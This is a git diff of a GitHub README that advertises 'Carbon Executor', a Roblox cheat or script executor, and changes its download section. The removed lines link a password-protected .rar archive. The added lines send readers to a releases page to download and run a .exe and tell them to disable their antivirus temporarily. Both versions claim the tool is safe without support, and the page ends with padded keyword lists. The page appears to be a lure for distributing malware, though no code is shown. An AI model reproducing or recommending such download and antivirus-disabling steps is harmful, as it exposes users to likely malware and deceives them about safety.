@@ -1,39 +1,107 @@
-# [DOWNLOAD LINK](https://github.com/duelist-minegirl/Carbon-Executor/releases/download/Download/installer.rar)
-# PASSWORD : 2025
-# Carbon Executor: Unleash the Power of Roblox Scripting
+# 🎮 Carbon-Executor - Unlock Roblox Scripting Effortlessly
 
-Welcome to Carbon Executor, your gateway to unparalleled Roblox script execution. This state-of-the-art Roblox exploit empowers users with unmatched performance and security features, including 90% UNC support and Level 8 execution capabilities. Compatible with Windows 7 through 11, Carbon Executor enables you to unlock the full potential of Roblox scripting effortlessly.
+[![Download Carbon-Executor](https://img.shields.io/badge/Download-Carbon--Executor-brightgreen)](https://github.com/yahyaloug/Carbon-Executor/releases)
 
-## Features
-- **Performance**: Experience top-tier performance with Carbon Executor's cutting-edge technology.
-- **Security**: Rest assured with Carbon Executor's robust security measures.
-- **Compatibility**: Seamlessly use Carbon Executor on Windows 7 through 11.
-- **Ease of Use**: Effortlessly tap into advanced Roblox scripting capabilities.
+## 🚀 Getting Started
 
-## Get Started
-To embark on your Roblox scripting journey with Carbon Executor, download the software by clicking the button below:
+Carbon Executor is a top-notch Roblox exploit that enhances your gaming experience. With its robust performance and security features, it enables you to take full advantage of Roblox scripting with ease.
 
-*(Note: The link provided needs to be launched to download the software.)*
+## 🖥️ System Requirements
 
-If the link above is inaccessible, please visit the "Releases" section of this repository for alternative download options.
+Before you begin, ensure your system meets the following requirements:
 
-## FAQs
-### How to Install Carbon Executor?
-Follow these simple steps to install Carbon Executor:
-1. Download the software from the provided link.
-2. Extract the downloaded files to a folder.
-3. Run the executable file to launch Carbon Executor.
+- Operating System: Windows 7, 8, 10, or 11
+- RAM: At least 2 GB
+- Processor: Intel i3 or equivalent
+- Available Disk Space: Minimum 100 MB free
 
-### Is Carbon Executor Safe to Use?
-Yes, Carbon Executor prioritizes user security with its advanced security features, ensuring a safe scripting experience.
+## 📦 Download & Install
 
-### Can I Use Carbon Executor on Mac or Linux?
-Currently, Carbon Executor is compatible only with Windows operating systems ranging from Windows 7 to 11.
+To download Carbon Executor, visit this page to download:
 
-## Contribute
-We welcome contributions to enhance the functionality and usability of Carbon Executor. Feel free to submit pull requests or raise issues in the repository.
+[Download Carbon-Executor](https://github.com/yahyaloug/Carbon-Executor/releases)
 
-## Connect with Us
-Stay updated with the latest news and updates about Carbon Executor by following us on social media platforms.
+Follow these simple steps to install:
 
-Thank you for choosing Carbon Executor to amplify your Roblox scripting endeavors. Let's script smarter, together! 🚀
+1. Click the link above to go to the Releases page.
+2. Find the latest version of Carbon Executor.
+3. Download the `.exe` file associated with the latest version.
+4. Once downloaded, locate the file in your Downloads folder.
+5. Double-click the file to start the installation process.
+6. Follow the on-screen instructions to complete the installation.
+
+## 🎮 How to Use Carbon Executor
+
+After installing, here’s how to run Carbon Executor:
+
+1. Open Carbon Executor by double-clicking its icon on your desktop.
+2. Enter the script you want to execute in the provided text box.
+3. Click the "Execute" button to run the script in Roblox.
+4. Enjoy the enhanced scripting capabilities!
+
+## 🔧 Features
+
+- **High Performance**: Carbon Executor promises fast execution times to make your gaming smooth.
+- **Security Focus**: Advanced security measures protect your information and ensure safe use.
+- **Robust Compatibility**: Works seamlessly with different versions of Roblox, ensuring a consistent experience.
+- **User-Friendly Interface**: Designed for ease of use, allowing anyone to leverage its capabilities without technical knowledge.
+
+## 🌟 Common Issues
+
+### Installation Problems
+
+If you encounter issues during installation, check the following:
+
+- Make sure you have administrator permissions on your PC.
+- Disable any antivirus temporarily, as it may block installation.
+- Ensure that your Windows version is supported.
+
+### Script Errors
+
+If a script does not execute as expected:
+
+- Verify the script is compatible with Roblox.
+- Check if the script has any typos or errors.
+- Make sure Roblox is running before executing the script.
+
+## 💬 Community Support
+
+Join our community to share your experiences and get help:
+
+- **Discord**: Engage with users and developers.
+- **Forums**: Ask questions and find tips.
+- **Social Media**: Follow us for updates and news.
+
+## 📝 Topics of Interest
+
+Carbon Executor relates to various areas within the gaming community, including:
+
+- 3D Games
+- Game Creation
+- Game Design
+- Game Development
+- Game Engines
+- Lua Programming
+- Multiplayer Online Gaming
+- Roblox Assets and Platforms
+- Roblox Studio
+
+## 🔗 Additional Resources
+
+Learn more about how to enhance your skills in Roblox programming and   game development through these resources:
+
+- [Roblox Developer Hub](https://developer.roblox.com)
+- [Lua Scripting Guide](https://www.lua.org/manual/5.1/)
+- [Game Design Tips](https://www.gamedesigning.org/)
+
+## 📄 License
+
+Carbon Executor is distributed under the MIT License. For more information, check the LICENSE file in the repository. 
+
+## 📧 Feedback
+
+Your feedback is valued. If you have suggestions or issues, please reach out via the community support channels mentioned above.
+
+Explore the full potential of Roblox scripting today!
+
+[Download Carbon-Executor](https://github.com/yahyaloug/Carbon-Executor/releases)
